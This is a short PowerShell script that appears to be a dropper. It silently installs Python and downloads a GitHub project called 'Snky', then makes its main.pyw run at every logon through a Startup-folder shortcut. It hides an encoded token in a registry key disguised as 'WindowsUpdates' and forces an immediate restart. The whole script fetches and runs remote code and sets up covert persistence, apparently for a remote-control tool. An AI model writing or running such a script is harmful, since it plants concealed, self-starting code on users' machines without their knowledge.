$projectUrl = "https://github.com/richa-z/Snky/archive/refs/heads/main.zip"
$pythonUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
$pythonInstaller = "$($env:TEMP)\python.exe"
$reg_path = "HKCU:\Software\WindowsUpdates"
$property_name = "a"
$property_value = "GZIP UR TOKEN, B64 ENCRYPT IT AND PASTE IT HERE"

#PYTHON INSTALLER
Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonInstaller

#PYTHON INSTALLATION
Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0" -Wait
$pythonPath = Join-Path $env:ProgramFiles "Python310"
[System.Environment]::SetEnvironmentVariable("Path", "$($env:Path);$pythonPath","User")

Invoke-WebRequest -Uri $projectUrl -OutFile "$($env:TEMP)\Snky.zip"
Expand-Archive -Path "$($env:TEMP)\Snky.zip" -DestinationPath "$($env:LOCALAPPDATA)\Snky" -Force
cmd.exe /c pip install -r "$($env:LOCALAPPDATA)\Snky\Snky-main\requirements.txt"

#SCUT
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$($env:APPDATA)\Microsoft\Windows\Start Menu\Programs\Startup\Snky.lnk")
$Shortcut.TargetPath = "c:\System32\cmd.exe"
$Shortcut.Arguments = "$($env:LOCALAPPDATA)\Snky\Snky-main\main.pyw $token"
$Shortcut.Save()

#REGISTRY
if (!(Test-Path $reg_path)) {
    New-Item -Path $reg_path -Force | Out-Null
}

New-Item -Path $reg_path

New-ItemProperty -Path $reg_path -Name $property_name -Value $property_value -PropertyType String -Force | Out-Null

#Start-Process "$($env:LOCALAPPDATA)\Snky\Snky-main\main.pyw" $token -Wait -WindowStyle Hidden

cmd.exe /c shutdown /r /t 0


